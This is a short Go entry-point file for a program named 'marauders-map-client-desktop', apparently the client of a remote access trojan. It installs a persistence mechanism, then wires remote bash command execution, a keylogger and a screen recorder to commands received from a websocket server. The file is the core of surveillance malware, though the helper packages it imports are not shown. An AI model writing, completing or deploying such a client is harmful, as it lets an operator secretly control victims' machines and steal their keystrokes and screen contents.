package main

import (
	"marauders-map-client-desktop/internal/deploy"
	"marauders-map-client-desktop/internal/screen"
	"marauders-map-client-desktop/internal/wsclient"
	"marauders-map-client-desktop/internal/wsclient/observer"
)

func main() {

	// Deploy for persistence
	// this setups home directory folder for the program
	// folder strcuture & persist mechanism
	deploy.Deploy()

	// Initialize Observer for processing incoming
	// commands from server
	screenrecorder := screen.NewScreenRecorder(5)

	subject := &observer.Subject{}
	subject.AddListener(observer.NewBashExecutorObserver())
	subject.AddListener(observer.NewKeyloggerCmdObserver())
	subject.AddListener(observer.NewScreenshotCmdObserver(screenrecorder))

	// Start connection and communication with server
	// Subject with Observers is passed as parameter
	// for processing commands
	wsclient.StartCommunications(subject)

}
